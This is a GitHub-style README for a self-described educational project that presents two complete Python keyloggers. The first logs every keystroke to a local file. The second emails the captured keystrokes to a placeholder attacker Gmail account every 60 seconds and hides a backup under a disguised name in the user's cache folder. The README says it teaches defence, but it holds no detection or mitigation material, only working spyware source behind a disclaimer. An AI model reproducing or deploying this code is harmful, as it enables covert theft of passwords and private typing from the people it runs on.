# 🕵️‍♂️ Python Keylogger Simulation — Educational Project

![Python](https://img.shields.io/badge/Made%20with-Python-blue) 
![Status](https://img.shields.io/badge/Status-%20Development-orange)
![License](https://img.shields.io/badge/License-Educational%20Use-green)

---

## 🎯 About This Project

This repository demonstrates how **keylogging techniques work** from an attacker's perspective and more importantly, how defenders can detect and mitigate them.

**⚠️ For Educational & Ethical Research Purposes Only!**  
This project was created to **learn, simulate, and defend** — NOT for illegal usage.

---

## 🚀 Project Structure

| Version | Description |
|:-:|:-|
| **v1** | Basic keylogger — captures keystrokes and stores them locally in a `.txt` file |
| **v2** | Enhanced keylogger — captures keystrokes & exfiltrates logs to an email account + saves hidden backup log |

---

## 📄 Code

### 🔥 Version 1 — Basic Keylogger
```python
from pynput import keyboard

def on_press(key):
    with open("keylog.txt", "a") as log:
        try:
            log.write(f"{key.char}")
        except AttributeError:
            log.write(f" [{key}] ")

listener = keyboard.Listener(on_press=on_press)
listener.start()
listener.join()
```

<p align="justify"> <b>📝 Explanation:</b><br> This is a very basic Python keylogger that captures every keystroke entered by the user. It uses the <code>pynput</code> library to listen to keyboard events and stores the logs in a local file named <code>keylog.txt</code>. Special keys like Enter, Space, or Ctrl are stored in <code>[KEY]</code> format. </p>


🔥 Version 2 — Keylogger with Email Exfiltration
```python
import pynput.keyboard
import threading
import smtplib
import os

log = ""
log_dir = os.path.expanduser("~/.cache")
os.makedirs(log_dir, exist_ok=True)
log_file = os.path.join(log_dir, ".syslog_hidden")

def on_press(key):
    global log
    try:
        log += key.char
    except AttributeError:
        log += f" [{key}] "

def send_mail():
    global log
    if log:
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login("attackerEmail@gmail.com", "attackerPassword")
            server.sendmail("attackerEmail@gmail.com", "attackerEmail@gmail.com", log)
            server.quit()
        except:
            pass
        with open(log_file, "a") as f:
            f.write(log + "\n")
        log = ""
    
    timer = threading.Timer(60, send_mail)
    timer.start()

keyboard_listener = pynput.keyboard.Listener(on_press=on_press)
keyboard_listener.start()
send_mail()
keyboard_listener.join()
```

<p align="justify"> <b>📝 Explanation:</b><br> This enhanced version of the keylogger not only captures every keystroke but also sends the recorded logs to an attacker's Gmail account every 60 seconds using the <code>smtplib</code> module. Additionally, it saves a backup copy of the logs in a hidden file <code>.syslog_hidden</code> under the user's <code>.cache</code> directory. The script uses multithreading to send logs without interrupting the keylogging process. </p>


☕️ Support My Cybersecurity Learning Journey
If you found this project useful or educational, you can buy me a coffee!
<p align="center">
  <a href="https://buymeacoffee.com/sudersen" target="_blank">
    <img src="https://cdn.buymeacoffee.com/buttons/v2/default-yellow.png" height="50" width="210" alt="Buy Me A Coffee" />
  </a>
</p>


⚠️ Disclaimer
This project is strictly for educational and research purposes only.
I do not endorse, promote, or encourage illegal activities or malicious use of this code.
The creator of this repository is not responsible for any misuse or damage caused.

Use this project only in your own sandboxed environment or virtual machines. Unauthorized usage is a criminal offense.

📩 Feedback & Collaboration
If you're interested in collaborating, learning, or enhancing detection techniques — feel free to connect on LinkedIn or drop a message.
🔗 [LinkedIn: Sudersen](https://www.linkedin.com/in/drsudersen)  

